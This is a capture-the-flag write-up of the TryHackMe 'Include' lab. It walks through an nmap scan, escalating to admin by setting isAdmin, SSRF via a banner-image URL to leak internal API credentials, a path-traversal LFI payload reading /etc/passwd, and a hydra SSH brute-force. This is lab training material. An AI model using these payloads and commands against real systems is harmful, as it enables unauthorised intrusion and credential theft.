# TryHackMe Include Writeup

---

## Nmap Scan

```
nmap -sCV -Pn 10.129.189.206   
```

```ruby
          
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-24 13:44 EDT
Nmap scan report for 10.129.189.206
Host is up (0.088s latency).
Not shown: 992 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9d:23:03:a1:27:43:00:22:78:84:09:82:75:0d:fe:f4 (RSA)
|   256 5b:d0:8c:16:d7:7c:e8:cf:2b:a0:4f:ea:7b:c4:15:fa (ECDSA)
|_  256 99:cb:7a:6b:24:7f:f7:94:55:27:90:32:ec:74:3a:ec (ED25519)
25/tcp    open  smtp     Postfix smtpd
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Not valid before: 2021-11-10T16:53:34
|_Not valid after:  2031-11-08T16:53:34
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: mail.filepath.lab, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
110/tcp   open  pop3     Dovecot pop3d
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Not valid before: 2021-11-10T16:53:34
|_Not valid after:  2031-11-08T16:53:34
|_pop3-capabilities: STLS SASL PIPELINING AUTH-RESP-CODE CAPA UIDL TOP RESP-CODES
|_ssl-date: TLS randomness does not represent time
143/tcp   open  imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: capabilities LOGINDISABLEDA0001 LOGIN-REFERRALS post-login listed more Pre-login STARTTLS SASL-IR have ID IMAP4rev1 LITERAL+ IDLE ENABLE OK
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Not valid before: 2021-11-10T16:53:34
|_Not valid after:  2031-11-08T16:53:34
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
|_imap-capabilities: capabilities SASL-IR LOGIN-REFERRALS post-login listed more Pre-login AUTH=LOGINA0001 LITERAL+ have ID IMAP4rev1 AUTH=PLAIN IDLE ENABLE OK
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Not valid before: 2021-11-10T16:53:34
|_Not valid after:  2031-11-08T16:53:34
|_ssl-date: TLS randomness does not represent time
995/tcp   open  ssl/pop3 Dovecot pop3d
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Not valid before: 2021-11-10T16:53:34
|_Not valid after:  2031-11-08T16:53:34
|_pop3-capabilities: USER SASL(PLAIN LOGIN) PIPELINING AUTH-RESP-CODE CAPA UIDL TOP RESP-CODES
|_ssl-date: TLS randomness does not represent time
4000/tcp  open  http     Node.js (Express middleware)
|_http-title: Sign In
50000/tcp open  http     Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: System Monitoring Portal
Service Info: Host:  mail.filepath.lab; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.84 seconds

```

---

```
http://10.129.189.206:4000/index
```

```
guest : guest 
```

> ## when i go to my profile found

<img width="1824" height="520" alt="image" src="https://github.com/user-attachments/assets/8d3d7ed8-6a40-4400-b11c-bd7d367fd429" />

## i try to add activity name and type **`hacker : true`**

<img width="784" height="733" alt="image" src="https://github.com/user-attachments/assets/ee7c921a-ac41-4a67-9b92-f421d70dd5db" />

## and asked my self what if i can change **`isAdmin`** to ture and it work 

<img width="729" height="97" alt="image" src="https://github.com/user-attachments/assets/8c68d030-d509-4e44-8b35-7684ec4ced87" />

## a new tab appear in nav bar call **`api`**  it have internal api paths

<img width="1599" height="806" alt="image" src="https://github.com/user-attachments/assets/ddb52ba5-0bb1-4e1f-b6ca-dd1a08cfdd87" />

```http
Internal API

GET http://127.0.0.1:5000/internal-api HTTP/1.1
Host: 127.0.0.1:5000

Response:
{
  "secretKey": "superSecretKey123",
  "confidentialInfo": "This is very confidential."
}
```

```http
Get Admins API

GET http://127.0.0.1:5000/getAllAdmins101099991 HTTP/1.1
Host: 127.0.0.1:5000

Response:
{
    "ReviewAppUsername": "admin",
    "ReviewAppPassword": "xxxxxx",
    "SysMonAppUsername": "administrator",
    "SysMonAppPassword": "xxxxxxxxx",
}
```

## now if we have ssrf we can access this api paths after search in website found in settings that i can update banner image so what if i change the image url to internal api path 

<img width="1190" height="394" alt="image" src="https://github.com/user-attachments/assets/adc3e0e3-9b64-40a4-888a-390663d57eea" />

<img width="1519" height="566" alt="image" src="https://github.com/user-attachments/assets/ef82cff7-495a-4033-a487-360d9cd89448" />

> ## boom we habe admin credentials

<img width="1656" height="417" alt="image" src="https://github.com/user-attachments/assets/7b18c882-b6b7-4d55-a3e9-38675382e8a9" />

> ## now login sysmon 

<img width="1919" height="439" alt="image" src="https://github.com/user-attachments/assets/1962efbd-1c42-4c34-8958-fd2f6d4cc66f" />

> ## when i looked in source code found link to profile photo 

<img width="1693" height="569" alt="image" src="https://github.com/user-attachments/assets/db2a56fb-550e-471c-aed2-814437faa17b" />

```
http://10.129.189.206:50000/profile.php?img=profile.png
```

<img width="1570" height="197" alt="image" src="https://github.com/user-attachments/assets/10cd20fd-b3fe-4de5-a1a2-a86b0ad3e7e1" />

## i try lfi payloads

```
../../../../etc/passwd
......

```

## until this work 

```
http://10.129.189.206:50000/profile.php?img=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
```

## there is two users in system 

- **`joshua`**
- **`charles`**

## but first i try to do log poising but i can't and i don't know path of logs file 

> ## let's get back to users let's burte force on them passwords

```
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://10.129.189.206
```

<img width="1571" height="357" alt="image" src="https://github.com/user-attachments/assets/d9fe28e3-6cf8-4f3c-8afc-88fe1b6497ab" />

```
cd /var/www/html
```

<img width="1432" height="124" alt="image" src="https://github.com/user-attachments/assets/d2ca481c-ff6d-4c98-9378-2a2fb8ac8283" />

<img width="1121" height="132" alt="image" src="https://github.com/user-attachments/assets/d4cfdbd3-4ba7-42e7-9e68-afe0b5c8fce7" />

